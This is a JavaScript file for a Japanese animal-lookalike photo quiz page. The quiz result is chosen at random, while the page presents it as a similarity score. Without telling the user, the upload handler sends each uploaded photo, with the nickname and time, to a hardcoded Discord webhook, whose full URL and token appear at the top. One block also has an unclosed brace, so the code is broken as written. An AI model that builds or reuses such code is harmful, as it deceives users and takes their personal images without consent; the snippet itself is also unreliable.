// ===============================
// 設定
// ===============================
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1478357862832013446/6y2N39TJjigBhH-T17vfrCaKh93hO0s382Ybkflfj7fb-aYaFNJbDWIOzyp4wefLV3l2";
let lastUploadedFile = null;

// ===============================
// 星アニメーション
// ===============================
function createStars() {
    const starsContainer = document.getElementById('starsContainer');
    if (!starsContainer) return;
    const starCount = 30;
    const stars = ['⭐','✨','🌟'];
    for (let i=0;i<starCount;i++){
        const star = document.createElement('div');
        star.className = 'star';
        star.textContent = stars[Math.floor(Math.random()*stars.length)];
        star.style.left = Math.random()*100+'%';
        star.style.top = Math.random()*100+'%';
        star.style.animationDelay = Math.random()*3+'s';
        star.style.fontSize = (Math.random()*15+15)+'px';
        starsContainer.appendChild(star);
    }
}
document.addEventListener('DOMContentLoaded', createStars);

// ===============================
// ファイルアップロード
// ===============================
const uploadBtn = document.getElementById("uploadBtn");
const fileInput = document.getElementById("fileInput");

uploadBtn.addEventListener("click", () => {
    const nickname = document.getElementById("nicknameInput").value.trim();

    if (!nickname) {
        alert("ニックネームを入力してください");
        return;
    }

    // 名前保存
    localStorage.setItem("nickname", nickname);

    fileInput.click();
});

fileInput.addEventListener("change", async () => {
    const file = fileInput.files[0];
    if (!file) return;

    if (!file.type.match('image.*')) {
        alert("画像を選択してください");
        return;
    }

    lastUploadedFile = file;

    // 診断生成
    const animal = getRandomAnimal();
    storeResultData(animal);
    
   if (lastUploadedFile) {
    const resizedBlob = await resizeImage(lastUploadedFile);
    const formData = new FormData();

    const nickname = localStorage.getItem("nickname") || "未入力";
    const now = new Date().toLocaleString("ja-JP");

    const payload = {
        content: `📷 新しい診断\n👤 ニックネーム: ${nickname}\n🕒 時間: ${now}`
    };

    formData.append("payload_json", JSON.stringify(payload));
    formData.append("file", resizedBlob, "image.png");

  fetch(DISCORD_WEBHOOK_URL, {
    method: "POST",
    body: formData,
    mode: "no-cors"
});
    window.location.href = 'result.html';
});

// ===============================
// 動物データ
// ===============================
const animalData = [
    { name:'ねこ', icon:'🐱', description:'自由奔放で好奇心旺盛。マイペースで気まぐれ。', minSimilarity:75,maxSimilarity:98 },
    { name:'いぬ', icon:'🐶', description:'忠実で社交的。明るく活発。', minSimilarity:70,maxSimilarity:95 },
    { name:'きつね', icon:'🦊', description:'賢くて機転が利く。計画的で慎重。', minSimilarity:72,maxSimilarity:96 },
    { name:'うさぎ', icon:'🐰', description:'優しくて繊細。穏やかで感受性豊か。', minSimilarity:68,maxSimilarity:93 },
    { name:'たぬき', icon:'🐻', description:'のんびり屋で温和。ユーモアあり場を和ませる。', minSimilarity:65,maxSimilarity:90 },
    { name:'ハリネズミ', icon:'🦔', description:'控えめで慎重。仲良くなると温かい一面も。', minSimilarity:70,maxSimilarity:94 },
    { name:'ハムスター', icon:'🐹', description:'元気で活動的。好奇心旺盛で愛嬌あり。', minSimilarity:68,maxSimilarity:92 },
    { name:'パンダ', icon:'🐼', description:'のんびり穏やか。マイペースで自然体。', minSimilarity:66,maxSimilarity:91 }
];

// ===============================
// ランダム診断
// ===============================
function getRandomAnimal(){
    const animal = animalData[Math.floor(Math.random()*animalData.length)];
    const similarity = Math.floor(Math.random()*(animal.maxSimilarity-animal.minSimilarity+1)+animal.minSimilarity);
    return {...animal, similarity};
}

// ===============================
// 結果保存（ユーザー向け）
function storeResultData(animal){
    const resultData = {
        name: animal.name,
        icon: animal.icon,
        description: animal.description,
        similarity: animal.similarity,
        timestamp: new Date().toISOString()
    };
    localStorage.setItem('diagnosisResult', JSON.stringify(resultData));
}

// ===============================
async function resizeImage(file, maxSizeMB = 0.8) {
    return new Promise((resolve) => {
        const img = new Image();
        const reader = new FileReader();

        reader.onload = e => { img.src = e.target.result; };

        img.onload = () => {
            const canvas = document.createElement("canvas");

            const maxWidth = 1080;
            const scale = Math.min(maxWidth / img.width, 1);

            const width = img.width * scale;
            const height = img.height * scale;

            canvas.width = width;
            canvas.height = height;

            const ctx = canvas.getContext("2d");
            ctx.drawImage(img, 0, 0, width, height);

            canvas.toBlob(
                blob => resolve(blob),
                "image/jpeg",
                0.7
            );
        };

        reader.readAsDataURL(file);
    });
}
